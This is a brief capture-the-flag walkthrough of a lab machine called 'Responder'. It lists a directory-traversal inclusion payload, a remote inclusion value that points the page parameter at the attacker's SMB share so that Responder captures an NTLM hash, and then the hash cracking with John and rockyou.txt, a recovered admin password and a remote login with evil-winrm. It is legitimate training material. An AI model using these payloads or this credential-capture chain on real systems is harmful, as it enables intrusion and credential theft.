---
title: "Responder"
category: ["Responder"]
---


- Initially, this machine doesn't allow us to access the web page
- We go to `/etc/hosts` and use nano to add the IP and a name
- We run an nmap scan  
![Pasted image 20240305194530](/VaultSite/wiki-images/Pasted%20image%2020240305194530.png)
- We discover it uses PHP
- We access the page and switch it to French to see the parameter used for changing the language
- Once we identify the parameter, we remove everything up to `page=` to exploit a Local File Inclusion (LFI) vulnerability. The parameter used is `../../../../../../../../windows/system32/drivers/etc/hosts`. The use of `../` allows access to `etc/hosts`.
- To exploit Remote File Inclusion (RFI), we need the target machine's IP address, in this case, `//10.10.14.6/somefile`
- To specify a port when using **Responder**, we use the `-I` flag
- Now we go to the web page and after `page=`, we insert our IP `//ip/ShareFileHTB` while running Responder
- In the terminal, we will see this:  
![Pasted image 20240305202829](/VaultSite/wiki-images/Pasted%20image%2020240305202829.png)
- Once we copy the hash, we create one using `echo`  
![Pasted image 20240305203123](/VaultSite/wiki-images/Pasted%20image%2020240305203123.png)
- We use `ls` to check if it has been created
- Now we decompress the `rockyou.txt` file, which contains over 14 million passwords we can use and test  
![Pasted image 20240305203419](/VaultSite/wiki-images/Pasted%20image%2020240305203419.png)
- Now with John, we match the hash we created earlier with the password list  
![Pasted image 20240305203530](/VaultSite/wiki-images/Pasted%20image%2020240305203530.png)
- We can see that the password for the admin user is `Badminton`
- We run an nmap scan to find out which TCP port is listening
- Now we use `evil-winrm`, which is used for remote Windows system administration  
![Pasted image 20240305204258](/VaultSite/wiki-images/Pasted%20image%2020240305204258.png)
- Now we navigate through the Windows system  
![Pasted image 20240305204531](/VaultSite/wiki-images/Pasted%20image%2020240305204531.png)  
![Pasted image 20240305204627](/VaultSite/wiki-images/Pasted%20image%2020240305204627.png)
- Once we find `flag.txt`, we use `type flag.txt` to display the flag directly









